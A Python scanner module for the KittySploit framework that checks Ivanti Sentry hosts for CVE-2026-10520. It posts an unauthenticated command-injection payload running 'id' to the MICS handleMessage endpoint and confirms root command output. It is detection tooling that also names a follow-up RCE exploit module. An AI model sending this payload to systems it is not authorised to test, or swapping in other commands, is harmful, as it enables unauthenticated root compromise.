#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Ivanti Sentry CVE-2026-10520 detection",
        "description": (
            "Detects Ivanti Sentry vulnerable to CVE-2026-10520 by posting a benign "
            "commandexec (id) to /mics/api/v2/sentry/mics-config/handleMessage and "
            "checking for unauthenticated root-level command output."
        ),
        "author": ["ErrorInside", "Blue DeviL", "KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-10520",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-10520",
            "https://www.cve.org/CVERecord?id=CVE-2026-10520",
            "https://horizon3.ai/attack-research/vulnerabilities/cve-2026-10520/",
        ],
        "modules": [
            "exploits/linux/http/ivanti_sentry_cve_2026_10520_rce",
        ],
        "tags": [
            "web",
            "scanner",
            "ivanti",
            "sentry",
            "mobileiron",
            "mics",
            "rce",
            "command-injection",
            "cve-2026-10520",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["ivanti", "sentry", "mobileiron"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/mics/api/v2/sentry/"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "exploits/linux/http/ivanti_sentry_cve_2026_10520_rce",
                ],
            },
        },
    }

    _ENDPOINT = "/mics/api/v2/sentry/mics-config/handleMessage"
    _CMD_TMPL = (
        "execute system /configuration/system/commandexec "
        "<commandexec><index>1</index><reqandres>{}</reqandres></commandexec>"
    )

    port = OptPort(8443, "Ivanti Sentry HTTPS port", True)
    ssl = OptBool(True, "Use HTTPS", True, advanced=True)
    endpoint = OptString(
        _ENDPOINT,
        "MICS handleMessage endpoint path",
        required=False,
        advanced=True,
    )

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    @staticmethod
    def _extract_output(text: str) -> str:
        if not text:
            return ""
        try:
            data = json.loads(text)
            result = str(data.get("data") or "")
        except Exception:
            result = text
        result = re.sub(r"<result><success>", "", result)
        result = re.sub(r"</success></result>", "", result)
        return result.strip()

    def run(self):
        path = self._opt(self.endpoint) or self._ENDPOINT
        if not path.startswith("/"):
            path = "/" + path

        message = self._CMD_TMPL.format("id")
        body = "message=" + quote(message, safe="")
        response = self.http_request(
            method="POST",
            path=path,
            data=body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "Connection": "close",
            },
            timeout=max(int(self.timeout or 25), 15),
            allow_redirects=False,
        )
        if not response:
            print_error("No response from handleMessage")
            return False

        if response.status_code in (301, 302, 303, 307, 308, 401, 403):
            self.set_info(
                severity="info",
                reason=(
                    f"handleMessage gated (HTTP {response.status_code}); "
                    "likely patched / auth enforced"
                ),
            )
            return False

        output = self._extract_output(response.text or "")
        if response.status_code == 200 and ("uid=" in output or "gid=" in output):
            self.set_info(
                severity="critical",
                cve="CVE-2026-10520",
                reason=f"Unauthenticated root command injection confirmed: {output}",
            )
            print_success(f"Vulnerable — command output: {output}")
            return True

        print_error("Ivanti Sentry CVE-2026-10520 not confirmed")
        return False
